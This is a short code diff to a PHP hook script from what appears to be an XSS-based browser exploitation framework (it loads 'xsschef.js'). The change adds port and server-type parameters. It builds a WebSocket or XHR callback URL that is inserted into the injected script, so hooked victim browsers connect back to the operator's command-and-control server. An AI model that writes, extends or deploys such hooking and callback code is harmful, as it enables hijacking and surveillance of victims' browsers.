@@ -17,7 +17,17 @@
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
 $script = file_get_contents('xsschef.js');
-$url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/hook.php', '/server.php', $_SERVER['SCRIPT_NAME']);
+$port = !empty($_GET['p']) ? (int) $_GET['p'] : 8080;
+$server_type = !empty($_GET['t']) ? $_GET['t'] : 'ws';
+
+switch ($server_type) {
+    case 'xhr':
+        $url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/hook.php', '/server-xhr.php', $_SERVER['SCRIPT_NAME']);
+        break;
+    case 'ws':
+    default:    
+        $url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . preg_replace('/\:.*/', '', $_SERVER['HTTP_HOST']) . ':' . $port . '/chef'; 
+}
 
 $ch = 'c'.crc32(rand() . time());
 $script = str_replace('__URL__', $url, $script);
